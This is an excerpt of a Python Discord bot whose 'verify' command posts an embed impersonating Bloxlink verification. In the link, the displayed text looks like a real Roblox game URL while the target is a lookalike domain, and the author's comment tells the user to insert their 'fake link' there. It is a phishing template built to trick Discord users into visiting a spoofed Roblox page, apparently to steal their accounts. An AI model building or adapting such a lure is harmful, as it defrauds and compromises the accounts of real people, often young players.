...
import asyncio
TOKEN = '' #INSTERT YOUR BOT TOKEN THERE
...
async def verify(ctx):
    ...
    test_e.add_field(name="Please verify your account with Bloxlink by joining this game!", value="[https://www.roblox.com/games/3918221347/Bloxlink-Verification-Game?privateServerLinkCode=537609936925]https://wwvwvv-roblox.com/games/1271943503/Bloxlink-Verification-Game?privateServerLinkCode=78880902049699480316323070136047)", inline=False) #INSERT YOUR FAKE LINK AT THE () PART
